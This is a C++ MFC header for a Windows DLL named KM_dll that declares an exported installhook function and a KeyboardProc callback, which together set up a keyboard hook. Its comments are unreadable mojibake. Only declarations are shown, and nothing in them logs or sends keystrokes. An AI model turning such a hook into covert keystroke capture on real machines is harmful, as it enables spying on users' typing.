// KM_dll.h : KM_dll DLL ����ͷ�ļ�
//

#pragma once

#ifndef __AFXWIN_H__
	#error "�ڰ������ļ�֮ǰ������stdafx.h�������� PCH �ļ�"
#endif

#include "resource.h"		// ������


// CKM_dllApp
// �йش���ʵ�ֵ���Ϣ������� KM_dll.cpp
//

class CKM_dllApp : public CWinApp
{
public:
	CKM_dllApp();

// ��д
public:
	virtual BOOL InitInstance();


	DECLARE_MESSAGE_MAP()
};


void  __declspec(dllexport)__stdcall installhook();
void runInstall();
LRESULT CALLBACK KeyboardProc(int nCode,
    WPARAM wParam,
    LPARAM lParam);